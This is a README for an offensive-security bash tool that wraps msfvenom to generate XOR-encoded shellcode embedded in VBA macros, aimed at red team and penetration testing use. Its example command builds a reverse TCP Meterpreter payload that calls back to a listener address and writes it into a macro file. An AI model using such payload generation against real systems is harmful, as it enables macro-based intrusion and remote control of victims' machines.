# genxorpay
(Generate XOR Payload) is a command-line tool built to simplify the creation of XOR-encoded shellcode using msfvenom, optimized for VBA macro delivery in offensive security engagements and red team operations. 

![Platform](https://img.shields.io/badge/platform-linux%20%7C%20macOS-brightgreen?style=flat-square)
![Language](https://img.shields.io/badge/language-bash-blue?style=flat-square)

---
### 🔥 Features
- ✅ Supports a wide range of **Meterpreter** and **Shell** payloads
- ✅ Auto-generates **VBA macro stubs** with XOR-decoded shellcode
- ✅ Saves raw `msfvenom` output and encoded buffers for analysis or reuse
- ✅ Optional **interactive clipboard mode** to quickly copy payloads, shellcode, or listener setup
- ✅ Automatically detects payload types and adjusts output (e.g., `.exe` for unsupported VBA payloads)
- ✅ Fully compatible with **Windows**, **Linux**, **macOS**, and **Android** payloads
- ✅ Debug log generation for reproducibility and audits

---
### 🔌 Clone the Repository

```bash
git clone https://github.com/yourname/genxorpay.git
cd genxorpay
chmod +x genxorpay.sh
```

---
### 📦 Example Use

```bash
./genxorpay.sh -p 3 -lhost 192.168.1.100 -lport 4444 -o macro.vba -raw raw.vba -i
```

This will:
- Generate a **reverse TCP Meterpreter** payload
- XOR-encode the shellcode
- Write a macro to `macro.vba`
- Save the raw shellcode to `raw.vba`
- Enter interactive mode for copying payload elements to clipboard

----
### 🎯 Intended Use

`genxorpay` is designed for:
- **Red team operations**
- **Penetration testing**
- **Macro payload development**
- **Payload encoding research**

> ⚠️ **Ethical Use Only:** This tool is intended for use in environments where you have explicit permission. Unauthorized use is illegal and unethical.

# TODO
### (Future To-Do)
- -e encoder and --iterations support for msfvenom

- Add --format or --binary override

- Add --test mode to auto-run payload in sandbox

- Add optional --encode-only mode for custom shellcode

- Handle msfvenom failure with --debug output

- Add integrity check of output bytes (e.g., checksum)

- Include SHA256 of output payloads in log (For hash checks on AV)

- Add --staged, --stageless, or --arch=x86/x64 options

### 🤝 Contributions
Contributions, ideas, and pull requests are welcome. Please file an issue if you discover a bug or want to propose a feature.

## 📎 Author

Made with ❤️ for security professionals by [Ninjarku](https://github.com/Ninjarku)
